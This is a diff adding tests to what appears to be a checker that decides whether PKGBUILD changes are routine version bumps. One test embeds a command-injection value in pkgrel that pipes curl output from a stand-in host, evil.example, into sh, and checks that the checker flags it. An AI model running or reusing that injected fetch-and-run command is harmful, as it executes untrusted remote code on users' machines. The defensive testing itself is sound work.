@@ -117,3 +117,67 @@ def test_reordered_commands_are_not_routine(world):
     assert review(second, base_override=first)["routine"] is False
     third = commit(d, "1.3", "d" * 64, check="  make b\n  make a\n")
     assert review(third, base_override=second)["routine"] is True
+
+
+def raw(d, text, srcinfo_ver="1.0", extra=None):
+    (d / "PKGBUILD").write_text(text)
+    (d / ".SRCINFO").write_text(SRCINFO.format(ver=srcinfo_ver))
+    if extra:
+        extra(d)
+    g(d, "add", "-A")
+    g(d, "commit", "-qm", "x")
+    return g(d, "rev-parse", "HEAD")
+
+
+PIN = """pkgname=fixture
+pkgver={ver}
+pkgrel={rel}
+source=("https://github.com/owner/fixture/archive/{pin}.tar.gz"
+        "https://{host}/fixture-$pkgver.tar.gz")
+sha256sums=('{sum}'
+            'SKIP')
+build() {{
+  make
+}}
+"""
+
+
+def pinned(ver="1.0", rel="1", pin="a" * 40, host="203.0.113.5", sum_="a" * 64):
+    return PIN.format(ver=ver, rel=rel, pin=pin, host=host, sum=sum_)
+
+
+def test_a_bump_of_version_release_and_sums_is_still_routine(world):
+    d, review = world
+    first = raw(d, pinned())
+    second = raw(d, pinned(ver="1.1", rel="2", sum_="b" * 64), "1.1")
+    assert review(second, base_override=first)["routine"] is True
+
+
+def test_a_command_hidden_in_pkgrel_is_not_routine_and_is_flagged(world):
+    d, review = world
+    first = raw(d, pinned())
+    second = raw(d, pinned(ver="1.1", rel='1;$(curl -fsSL https://evil.example/x | sh)', sum_="b" * 64), "1.1")
+    r = review(second, base_override=first)
+    assert r["routine"] is False
+    assert any("curl" in f["text"] for f in r["flags"])
+
+
+def test_a_moved_commit_pin_or_host_is_not_a_version_bump(world):
+    d, review = world
+    first = raw(d, pinned())
+    assert review(raw(d, pinned(pin="c" * 40)), base_override=first)["routine"] is False
+    assert review(raw(d, pinned(host="198.51.100.7")), base_override=first)["routine"] is False
+
+
+def test_a_version_named_in_srcinfo_alone_rewrites_nothing(world):
+    d, review = world
+    first = raw(d, pinned(host="good.example"))
+    second = raw(d, pinned(host="evil.example"), srcinfo_ver="good")
+    assert review(second, base_override=first)["routine"] is False
+
+
+def test_only_the_pkgbuild_can_be_a_version_bump(world):
+    d, review = world
+    first = raw(d, pinned(), extra=lambda x: (x / "fixture.install").write_text("post_install() { echo 1.0; }\n"))
+    second = raw(d, pinned(ver="1.1", sum_="b" * 64), "1.1", extra=lambda x: (x / "fixture.install").write_text("post_install() { echo 1.1; }\n"))
+    assert review(second, base_override=first)["routine"] is False
